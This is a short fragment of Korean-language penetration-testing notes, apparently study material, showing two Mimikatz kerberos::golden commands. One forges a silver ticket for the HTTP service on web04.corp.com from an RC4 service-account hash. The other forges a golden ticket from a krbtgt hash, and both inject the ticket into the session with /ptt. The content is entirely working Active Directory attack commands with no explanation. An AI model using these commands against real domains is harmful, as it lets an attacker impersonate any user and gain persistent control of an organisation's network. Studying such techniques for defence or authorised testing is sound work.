...
# 위조 티켓 생성
kerberos::golden /sid:S-1-5-21-0-0-0 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:username
...
# 티켓 생성
kerberos::golden /user:<생성할 유저명 아무거나> /domain:corp.com /sid:S-1-5-21-0-0-0 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```
